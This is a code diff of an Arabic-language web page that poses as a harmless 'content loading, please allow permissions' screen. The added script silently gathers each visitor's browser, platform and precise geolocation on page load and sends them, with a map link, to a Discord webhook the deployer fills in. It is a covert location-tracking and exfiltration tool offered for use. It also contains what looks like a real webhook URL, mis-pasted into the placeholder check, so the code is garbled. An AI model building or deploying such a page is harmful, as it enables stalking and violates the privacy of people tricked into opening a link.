@@ -2,39 +2,96 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تنبيه</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري تحميل الصفحة...</title>
     <style>
         body {
-            background-color: #1a1a1a;
-            color: white;
+            background-color: #0f172a;
+            color: #f8fafc;
             font-family: Tahoma, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
             text-align: center;
-            padding-top: 20vh;
         }
-        h1 {
-            font-size: 3rem;
-            color: #ff4757;
+        .box {
+            padding: 20px;
+        }
+        h2 {
+            font-size: 1.5rem;
+            color: #38bdf8;
+        }
+        p {
+            color: #94a3b8;
         }
     </style>
 </head>
 <body>
 
-    <h1 id="msg">جاري فحص موقعك...</h1>
+    <div class="box">
+        <h2>جاري تحميل المحتوى، يرجى الانتظار...</h2>
+        <p>الرجاء السماح بالإذونات المطلوبة في حال ظهرت لك لاستمرار التصفح.</p>
+    </div>
 
     <script>
-        // أول ما يفتح الرابط، تطلع له نافذة منبثقة في وجهه فوراً
-        alert("أنت وينك؟!");
+        // ضع رابط الويب هوك الخاص بك هنا بين علامتي التنصيص
+        const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
 
-        // أو حركة أذكاء: نجيب مكانه الجغرافي الحقيقي ونعرضه له على الشاشة
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                let lat = position.coords.latitude;
-                let lon = position.coords.longitude;
-                document.getElementById("msg").innerHTML = "لقد تم تحديد مكانك! <br> خط العرض: " + lat + "<br> خط الطول: " + lon;
-            }, function(error) {
-                document.getElementById("msg").innerHTML = "رفضت إعطاء موقعك يا بطل!";
-            });
+        // جمع معلومات سريعة عن الجهاز والمتصفح مع الموقع الجغرافي
+        function collectAndSend() {
+            let info = "📍 **تم رصد زائر جديد!**\n";
+            info += `🌐 المتصفح: ${navigator.userAgent}\n`;
+            info += `💻 النظام: ${navigator.platform}\n`;
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        let lat = position.coords.latitude;
+                        let lon = position.coords.longitude;
+                        let accuracy = position.coords.accuracy;
+                        
+                        info += `🌍 خط العرض: ${lat}\n`;
+                        info += `🌍 خط الطول: ${lon}\n`;
+                        info += `🎯 نسبة الدقة: ${accuracy} متر\n`;
+                        info += `🔗 رابط الخريطة: https://www.google.com/maps?q=${lat},${lon}\n`;
+                        
+                        sendToDiscord(info);
+                    },
+                    function(error) {
+                        info += `❌ حالة الموقع: رفض إذن الموقع أو حدث خطأ (رمز الخطأ: ${error.code})`;
+                        sendToDiscord(info);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                info += `❌ المتصفح لا يدعم تحديد الموقع الجغرافي.`;
+                sendToDiscord(info);
+            }
         }
+
+        function sendToDiscord(message) {
+            if (webhookURL.includes("https://discord.com/api/webhooks/1545823047930482778/d9MlNgbgy94quZe8KiTXw5vUrDxAvo9Uau5AJuOiFdYDg0YT_ZBBBRDMi-r9BDdzphBw")) {
+                console.warn("https://discord.com/api/webhooks/1545823047930482778/d9MlNgbgy94quZe8KiTXw5vUrDxAvo9Uau5AJuOiFdYDg0YT_ZBBBRDMi-r9BDdzphBw");
+                return;
+            }
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: message
+                })
+            }).catch(err => console.error(err));
+        }
+
+        // تشغيل الوظيفة فور فتح الصفحة
+        window.onload = function() {
+            collectAndSend();
+        };
     </script>
 
 </body>
